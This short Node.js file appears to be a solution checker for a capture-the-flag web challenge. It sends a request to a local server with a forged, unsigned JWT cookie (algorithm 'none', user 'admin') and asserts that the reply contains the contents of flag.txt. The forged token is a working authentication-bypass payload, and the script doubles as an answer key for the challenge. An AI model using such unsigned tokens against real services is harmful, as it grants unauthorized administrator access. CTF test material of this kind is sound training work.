const assert = require("assert").strict;
const fetch = require("node-fetch");
const fs = require("fs");
const port = 3000;
let realFlag = "";

fs.readFile("flag.txt", (err, data) => {
    if (err) {
        console.error(err);
    } else {
        realFlag = data;
    }
});

fetch(`http://localhost:${port}/`, {
    headers: {
        method: "get",
        Cookie:
            "auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1OTkxMDYxNjF9.",
    },
})
    .then((res) => {
        return res.text();
    })
    .then((text) => {
        console.log(text);
        assert(text.includes(realFlag), () => {
            console.error("Flag does not match! ❌");
            return;
        });
    })
    .then(() => console.log("Flag matches! Test passed! ✅"))
    .catch((err) => console.error(err));
